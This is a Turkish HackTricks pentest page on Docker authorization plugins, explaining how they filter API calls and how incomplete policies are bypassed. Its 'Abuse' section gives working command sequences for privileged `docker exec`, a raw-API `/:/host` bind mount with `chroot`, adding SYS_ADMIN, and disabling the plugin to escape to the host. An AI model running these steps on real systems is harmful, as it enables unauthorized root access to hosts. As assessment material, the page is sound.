# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Runtime authorization plugins, bir çağıranın belirli bir daemon eylemini gerçekleştirip gerçekleştiremeyeceğine karar veren ek bir policy katmanıdır. Docker bunun klasik örneğidir. Varsayılan olarak Docker daemon ile iletişim kurabilen herkes, daemon üzerinde fiilen geniş bir kontrole sahip olur. Authorization plugins, kimliği doğrulanmış kullanıcıyı ve istenen API işlemini inceleyerek, ardından policy doğrultusunda isteğe izin verip vermeyerek bu modeli daraltmaya çalışır.

Bu konu kendi sayfasını hak eder; çünkü bir saldırganın zaten bir Docker API'sine veya `docker` grubundaki bir kullanıcıya erişimi olduğunda exploitation modelini değiştirir. Bu tür ortamlarda soru artık yalnızca "daemon'a ulaşabilir miyim?" değildir; aynı zamanda "daemon bir authorization layer tarafından sınırlandırılmış mı ve öyleyse bu layer işlenmeyen endpoint'ler, zayıf JSON parsing veya plugin-management izinleri üzerinden bypass edilebilir mi?" sorusudur.

## Çalışma Mantığı

Bir istek Docker daemon'a ulaştığında authorization subsystem, istek context'ini yüklü bir veya daha fazla plugin'e iletebilir. Plugin; kimliği doğrulanmış kullanıcı kimliğini, istek ayrıntılarını, seçili header'ları ve content type uygun olduğunda istek veya response body'sinin bazı bölümlerini görür. Birden fazla plugin zincirlenebilir ve erişim yalnızca tüm plugin'ler isteğe izin verirse verilir.

Bu model güçlü görünebilir, ancak güvenliği tamamen policy yazarının API'yi ne kadar eksiksiz anladığına bağlıdır. `docker run --privileged` komutunu engelleyen ancak `docker exec` davranışını göz ardı eden, top-level `Binds` gibi alternatif JSON key'lerini kaçıran veya plugin administration'a izin veren bir plugin, doğrudan privilege-escalation yollarını hâlâ açık bırakırken kısıtlama konusunda yanlış bir güven duygusu oluşturabilir.

## Yaygın Plugin Hedefleri

Policy incelemesi için önemli alanlar şunlardır:

- container creation endpoint'leri
- `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` gibi `HostConfig` alanları ve namespace-sharing seçenekleri
- `docker exec` davranışı
- plugin management endpoint'leri
- amaçlanan policy modelinin dışında runtime eylemlerini dolaylı olarak tetikleyebilecek tüm endpoint'ler

Geçmişte Twistlock'un `authz` plugin'i ve `authobot` gibi basit educational plugin'ler, policy dosyaları ve code path'leri endpoint-to-action eşlemesinin gerçekte nasıl uygulandığını gösterdiği için bu modeli incelemeyi kolaylaştırdı. Assessment çalışmaları açısından önemli ders, policy yazarının yalnızca en görünür CLI komutlarını değil, API surface'inin tamamını anlaması gerektiğidir.

## Abuse

İlk hedef, gerçekte nelerin engellendiğini öğrenmektir. Daemon bir eylemi reddederse hata çoğu zaman plugin adını leak eder; bu da kullanılan control'ü tanımlamaya yardımcı olur:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Daha kapsamlı endpoint profiling gerekiyorsa, `docker_auth_profiler` gibi araçlar kullanışlıdır; çünkü plugin tarafından hangi API route'larının ve JSON yapılarının gerçekten izin verildiğini kontrol etme gibi aksi hâlde tekrarlayan bir görevi otomatikleştirir.

Ortam custom plugin kullanıyorsa ve API ile etkileşim kurabiliyorsanız, hangi object field'larının gerçekten filtrelendiğini listeleyin:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Bu kontroller önemlidir; çünkü birçok yetkilendirme hatası kavramdan ziyade alana özgüdür. Bir plugin, eşdeğer API yapısını tamamen engellemeden bir CLI pattern’ini reddedebilir.

### Tam Örnek: `docker exec`, Container Oluşturulduktan Sonra Ayrıcalık Ekler

Ayrıcalıklı container oluşturmayı engelleyen ancak kısıtlamasız container oluşturulmasına ve `docker exec` kullanımına izin veren bir policy yine de bypass edilebilir:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Daemon ikinci adımı kabul ederse kullanıcı, politika yazarının kısıtlı olduğuna inandığı bir container içinde ayrıcalıklı bir etkileşimli process elde etmiş olur.

### Full Example: Raw API Üzerinden Bind Mount

Bazı hatalı politikalar yalnızca tek bir JSON biçimini inceler. Root filesystem bind mount işlemi tutarlı şekilde engellenmezse host hâlâ mount edilebilir:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Aynı fikir `HostConfig` altında da görülebilir:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Etki, host dosya sistemine tam bir kaçıştır. İlginç ayrıntı, bypass'ın bir kernel hatasından değil, policy kapsamının eksik olmasından kaynaklanmasıdır.

### Tam Örnek: Denetlenmeyen Capability Attribute

Policy, capability ile ilgili bir attribute'u filtrelemeyi unutursa saldırgan, tehlikeli bir capability'yi yeniden kazanan bir container oluşturabilir:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
`CAP_SYS_ADMIN` veya benzer derecede güçlü bir capability mevcut olduğunda, [capabilities.md](protections/capabilities.md) ve [privileged-containers.md](privileged-containers.md) içinde açıklanan birçok breakout tekniğine erişilebilir.

### Tam Örnek: Eklentiyi Devre Dışı Bırakma

Plugin-management işlemlerine izin veriliyorsa en temiz bypass, kontrolü tamamen devre dışı bırakmak olabilir:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Bu, control-plane düzeyinde bir policy hatasıdır. Authorization katmanı mevcut olsa da kısıtlaması gereken kullanıcı, bu katmanı devre dışı bırakma iznine sahip olmaya devam eder.

## Kontroller

Bu komutlar, bir policy katmanının mevcut olup olmadığını ve eksiksiz mi yoksa yüzeysel mi göründüğünü belirlemeyi amaçlar.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Burada ilgi çekici olanlar:

- Bir plugin adı içeren reddetme mesajları, bir authorization katmanının varlığını doğrular ve çoğu zaman tam implementation'ı ortaya çıkarır.
- Saldırganın görebildiği bir plugin listesi, disable veya reconfigure işlemlerinin mümkün olup olmadığını keşfetmek için yeterli olabilir.
- Yalnızca bariz CLI eylemlerini engelleyen, ancak raw API requests işlemlerini engellemeyen bir policy, aksi kanıtlanana kadar bypass edilebilir kabul edilmelidir.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak etkin değil | Bir authorization plugin yapılandırılmadıkça daemon erişimi fiilen ya hep ya hiç şeklindedir | eksik plugin policy, allowlists yerine blacklists kullanılması, plugin management'a izin verilmesi, field-level blind spots |
| Podman | Yaygın bir doğrudan eşdeğeri yok | Podman genellikle Docker tarzı authz plugin'lerinden ziyade Unix permissions, rootless execution ve API exposure kararlarına dayanır | rootful Podman API'sinin geniş kapsamlı şekilde expose edilmesi, zayıf socket permissions |
| containerd / CRI-O | Farklı bir control model | Bu runtime'lar genellikle Docker authz plugin'leri yerine socket permissions, node trust boundaries ve daha üst katmandaki orchestrator kontrollerine dayanır | socket'in workload'lara mount edilmesi, zayıf node-local trust assumptions |
| Kubernetes | Docker authz plugin'leri yerine API-server ve kubelet katmanlarında authn/authz kullanır | Cluster RBAC ve admission controls ana policy katmanıdır | aşırı geniş RBAC, zayıf admission policy, kubelet veya runtime API'lerinin doğrudan expose edilmesi |
{{#include ../../../banners/hacktricks-training.md}}
